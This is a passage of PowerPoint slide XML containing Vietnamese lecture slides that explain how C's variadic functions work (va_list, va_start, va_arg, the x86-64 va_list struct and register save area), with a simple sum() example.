            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>printf đang lấy argument kiểu gì vậy ? Không hề giống một hàm bình thường ? </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_list và va_start  là gì  ?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>?</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TextBox 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="613836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Bài toán dynamic argument của printf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="2731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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Như các ví dụ trên thì ta có thể</a:t>
            </a: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alibri"/>
              </a:rPr>
              <a:t> thấy rằng số lượng argument </a:t>
            </a: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alibri"/>
              </a:rPr>
              <a:t>của printf </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>không hề cố định</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>.</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p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="99" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="70920"/>
            <a:ext cx="4761720" cy="675252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TextBox 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="7926840" cy="5774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spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Vậy cần một cơ chế để giải quyết vấn đề này ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="3168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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>C đã có một cách khá hay để giải quyết được gọi là  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Variable Argument List</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alibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>Đọc thêm ở : https://refspecs.linuxfoundation.org/elf/x86_64-SysV-psABI.pdf </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TextBox 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="176076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Examples </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="914400"/>
            <a:ext cx="5480280" cy="5565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800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>#include &lt;stdarg.h&gt;</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#include &lt;stdio.h&gt;</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int sum(int count, ...) {</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    long this_not_leak = 0x1337;</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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> ap;</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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="1E6A39"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(ap, count);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pP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    int total = 0;</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    for (int i = 0; i &lt; count; i++)</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        total += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="4E102D"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(ap, int);</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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(ap);</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    return total;</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int main() {</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    long this_get_leak = 0x1338;</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    printf("%d\n", sum(3, 10, 20, 30));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4343400" y="1371600"/>
            <a:ext cx="7460280" cy="29700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2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cùng xem qua example code để hiểu cách sử dụng hàm này:</a:t>
            </a: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Arial"/>
              </a:rPr>
              <a:t>  </a:t>
            </a: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Arial"/>
              </a:rPr>
              <a:t>Cách sử dụng  :  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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Arial"/>
              </a:rPr>
              <a:t>1.Tạo một struct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>va_list</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> ap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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Arial"/>
              </a:rPr>
              <a:t>2.Gọi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="1E6A39"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>va_start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> với struct đó và biến đầu tiên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pP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Arial"/>
              </a:rPr>
              <a:t>3. Call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="4E102D"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>để nhận các argument tiếp theo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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Variables Argument List — giải quyết cái gì ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="3808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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Bài toán nó cố giải quyết là gì ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF3838"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DYNAMIC argument length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> — số argument không biết trước</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alibri"/>
              </a:rPr>
              <a:t>Ý tưởng giải quyết gồm 2 bước :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. Snapshot toàn bộ registers vào một Register Save Area</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. Xây cách lấy argument từ snapshot đó </a:t>
            </a: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alibri"/>
              </a:rPr>
              <a:t>Cùng tìm hiểu cách nó được implement nhé .</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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="560880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Tại sao phải snapshot các register?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="943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2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>Ta cần lưu các registers vì argument được lưu ở register— mà không muốn chúng bị ghi đè mỗi lần printf gọi hàm nào khác </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>TRƯỚC KHI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t> ta gọi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>va_arg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Noto Sans CJK SC"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="109" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3162600" y="2286000"/>
            <a:ext cx="6666480" cy="427572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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="146412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va_start</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="687960" y="1205280"/>
            <a:ext cx="10964880" cy="2680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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>va_start phải được gọi trước lần va_arg đầu tiên, để nạp một object va_list hợp lệ.</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alibri"/>
              </a:rPr>
              <a:t>va_start là một macro, không phải Function.</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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="682416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Function và macro — khác nhau chỗ nào ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="1553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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Function: được compile thành machine code</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="3200"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Macro: preprocessor thay code bằng asm nên có thể làm việc với register</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="114" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5246280" y="2286360"/>
            <a:ext cx="6183720" cy="434304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5" name="TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="119952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va_list</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="458640" y="914400"/>
            <a:ext cx="10964880" cy="4885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onsolas"/>
              </a:rPr>
              <a:t>typedef struct { </a:t>
            </a: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onsolas"/>
              </a:rPr>
              <a:t>    unsigned int gp_offset;        // +0x00 </a:t>
            </a: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onsolas"/>
              </a:rPr>
              <a:t>    unsigned int fp_offset;        // +0x04</a:t>
            </a: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onsolas"/>
              </a:rPr>
              <a:t>    void *overflow_arg_area;       // +0x08</a:t>
            </a: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onsolas"/>
              </a:rPr>
              <a:t>    void *reg_save_area;           // +0x10</a:t>
            </a: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onsolas"/>
              </a:rPr>
              <a:t>} va_list[1];</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alibri"/>
              </a:rPr>
              <a:t>Giờ tìm hiểu từng field được dùng cho việc gì ?</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TextBox 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="171000"/>
            <a:ext cx="1870200" cy="5148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790" b="1" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sơ đồ stack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2790" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
